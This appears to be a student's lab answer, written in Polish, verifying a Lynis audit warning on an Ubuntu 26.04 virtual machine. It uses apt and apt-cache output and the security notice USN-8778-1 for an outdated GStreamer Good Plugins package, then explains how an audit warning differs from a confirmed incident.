67 packages can be upgraded. Run 'apt list --upgradable' to see them.
vboxuser@Ubuntu:/$ apt list --upgradable

Wybor rozwazan padl na: gstreamer1.0-plugins-good/resolute-updates,resolute-security 1.28.2-2ubuntu0.2 amd64 [upgradable from: 1.28.2-2ubuntu0.1]
Ze wzgledu na potwierdzenie ryzyka: ubuntu.com/security/notices/USN-8778-1 - GStreamer Good Plugins vulnerability, ktory dotyczy rowniez Ubuntu 26.04 LTS resolute racoon
Wiec, ostrzezenie Lynis PKGS-7392 to nie falszywy alarm

apt-cache policy gstreamer1.0-plugins-good
gstreamer1.0-plugins-good:
  Installed: 1.28.2-2ubuntu0.1
  Candidate: 1.28.2-2ubuntu0.2
  Version table:
     1.28.2-2ubuntu0.2 500
        500 http://pl.archive.ubuntu.com/ubuntu resolute-updates/main amd64 Packages
        500 http://security.ubuntu.com/ubuntu resolute-security/main amd64 Packages
 *** 1.28.2-2ubuntu0.1 100
        100 /var/lib/dpkg/status
     1.28.2-2 500
        500 http://pl.archive.ubuntu.com/ubuntu resolute/main amd64 Packages

USN-8778-1 podaje ze wersja gstreamer1.0-plugins-good 1.28.2-2ubuntu0.2 poprawia podatnosc CVE-2026-18649
https://nvd.nist.gov/vuln/detail/cve-2026-18649
https://github.com/advisories/GHSA-wr93-5xph-995g
https://www.cve.org/CVERecord?id=CVE-2026-18649

5. Wyjaśnij różnicę między ostrzeżeniem narzędzia audytowego a potwierdzonym incydentem.
Ostrzezenie w raporcie Lynis wskazuje na potencjalny problem. Lynis wykryl podatny pakiet. Nalezalo zweryfikowac 
to za pomoca APT oraz oficjalnych komunikatow o zagrozeniach bezpieczenstwa.
Potwierdzono dzieki temu obecnosc zagrozonej wersji pakietow.
